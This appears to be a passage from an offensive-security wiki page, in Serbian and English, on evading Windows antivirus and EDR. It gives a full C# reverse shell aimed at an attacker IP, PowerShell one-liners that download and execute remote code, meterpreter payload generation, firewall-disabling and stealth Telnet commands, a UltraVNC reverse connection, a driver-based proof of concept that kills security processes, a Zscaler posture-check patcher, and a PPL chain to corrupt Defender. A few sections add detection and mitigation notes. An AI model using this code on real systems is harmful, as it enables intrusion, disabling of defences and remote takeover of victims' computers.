> Ako želite da pročitate više o C# Assembly loading, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod koristeći druge jezike tako što ćete kompromitovanom računaru omogućiti pristup **interpreter environment-u instaliranom na Attacker Controlled SMB share**.

Dozvoljavanjem pristupa Interpreter Binaries i environment-u na SMB share-u možete **izvršavati proizvoljni kod u ovim jezicima unutar memorije** kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **veću fleksibilnost da zaobiđemo static signatures**. Testiranje sa nasumičnim ne-obfuskatovanim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili security proizvodom kao što je EDR ili AV**, omogućavajući im da smanje privilegije tako da proces neće umreti, ali neće imati dozvole da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **prevent external processes** od dobijanja handle-ova nad token-ima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je deploy-ovati Chrome Remote Desktop na žrtvinom PC-u i onda ga koristiti za takeover i održavanje persistence:
1. Download sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", pa kliknite na MSI file za Windows da preuzmete MSI fajl.
2. Pokrenite installer silently na žrtvi (admin potreban): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će tražiti autorizaciju; kliknite Authorize da nastavite.
4. Izvršite dati parameter uz male prilagodbe: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na pin param koji omogućava podešavanje pina bez korišćenja GUI-a).


## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg se borite ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), da biste stekli uvid u napredne evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odličan talk od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **otkrije koji deo Defender** smatra malicioznim i podeli ga sa vama.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web uslugom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows sistemi su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i isključi firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebne su vam bin datoteke, ne setup)

**ON THE HOST**: Execute _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Podesite lozinku u _VNC Password_
- Podesite lozinku u _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novo** kreirani fajl _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** treba da na svom **host** pokrene binarni `vncviewer.exe -listen 5900` tako da bude **pripremljen** da uhvati reverse **VNC connection**. Zatim, na **victim**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Da biste održali stealth, ne treba da uradite sledeće

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će veoma brzo terminisati proces.**

### Kompajliranje našeg vlastitog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer upotrebe python-a za izradu injektora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR iz kernel space

Storm-2603 je iskoristio mali konzolni utiliti poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što je isporučio ransomware. Alat dolazi sa svojim **vulnerable ali *signed* driver-om** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključni zaključci
1. **Signed driver**: Fajl isporučen na disk je `ServiceMouse.sys`, ali je binarni fajl legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto driver nosi validan Microsoft potpis, on se učitava čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel service**, a druga ga startuje tako da `\\.\ServiceMouse` postane dostupan iz user land-a.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD preskače user-mode zaštite u potpunosti; kod koji se izvršava u kernel-u može otvoriti *protected* procese, terminirati ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detection / Mitigation
•  Omogućite Microsoft-ovu listu za blokiranje vulnerable-driver-a (`HVCI`, `Smart App Control`) tako da Windows odbija da učita `AToolsKrnl64.sys`.  
•  Monitorujte kreiranje novih *kernel* servisa i alarmirajte kada se driver učitava iz world-writable direktorijuma ili nije prisutan na allow-listi.  
•  Pratite user-mode handle-e ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler-ov **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da komunicira rezultate drugim komponentama. Dva loša dizajnerska izbora omogućavaju potpuni bypass:

1. Posture evaluacija se događa **u potpunosti na klijentu** (serveru se šalje boolean).
2. Interni RPC endpoint-i samo validiraju da je povezani izvršni fajl **signed by Zscaler** (putem `WinVerifyTrust`).

Patch-ovanjem četiri signed binarna fajla na disku oba mehanizma mogu biti neutralisana:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaki check compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i unsigned) process može da se bind-uje na RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Sve** posture provere prikazuju **green/compliant**.
* Unsigned ili modifikovani binarni fajlovi mogu otvoriti named-pipe RPC endpoint-e (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova studija slučaja ilustruje kako čisto klijentske odluke o poverenju i jednostavne provere potpisa mogu biti poražene sa par bajt-patch-eva.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće hijerarhiju signer/level tako da samo procesi sa istim ili višim nivoom zaštite mogu menjati jedni druge. Ofanzivno, ako legalno pokrenete PPL-enabled binarni fajl i kontrolišete njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničenu, PPL-podržanu write primitivu prema zaštićenim direktorijumima koje koriste AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sam sebe i prima parametar za upis log fajla na putanju koju odredi pozivač.
- Kada se pokrene kao PPL proces, upis fajla se izvršava sa PPL podrškom.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 kratke putanje da biste pokazali na normalno zaštićene lokacije.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite PPL-kompatibilni LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da primorate kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 kratke nazive ako je potrebno.
3) Ako je ciljani binarni fajl obično otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u pre nego što AV krene tako što ćete instalirati auto-start servis koji pouzdano radi ranije. Validirajte redosled pri boot-u pomoću Process Monitor (boot logging).
4) Nakon reboot-a, upis sa PPL podrškom se dešava pre nego što AV zaključa svoje binarne fajlove, korumpirajući ciljani fajl i sprečavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Beleške i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim pozicioniranja; primitiv je pogodniji za korupciju nego za preciznu injekciju sadržaja.
- Zahteva lokalne admin/SYSTEM privilegije za instalaciju/pokretanje servisa i mogućnost restartovanja.
- Vremenski faktor je kritičan: target ne sme biti otvoren; izvršavanje pri pokretanju sistema izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, posebno kada je roditelj nestandardni launcher, oko boot-a.
- Novi servisi konfigurisani da automatski startuju sumnjive binarne fajlove i koji dosledno počinju pre Defender/AV. Istražite kreiranje/izmenu servisa pre pojave grešaka pri pokretanju Defender-a.
- Monitoring integriteta fajlova na Defender binarima/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa sa protected-process flagovima.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalno korišćenje PPL nivoa od strane non-AV binarnih fajlova.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binarni fajlovi mogu da rade kao PPL i pod kojim roditeljima; blokirajte pozivanje ClipUp van legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu auto-start servisa i nadgledajte manipulacije redom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch zaštite omogućene; istražite greške pri pokretanju koje ukazuju na korupciju binarnih fajlova.
- Razmotrite onemogućavanje generisanja 8.3 kratkih imena na volumenima koji hostuju alate za bezbednost ako je kompatibilno sa vašim okruženjem (temeljno testirati).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
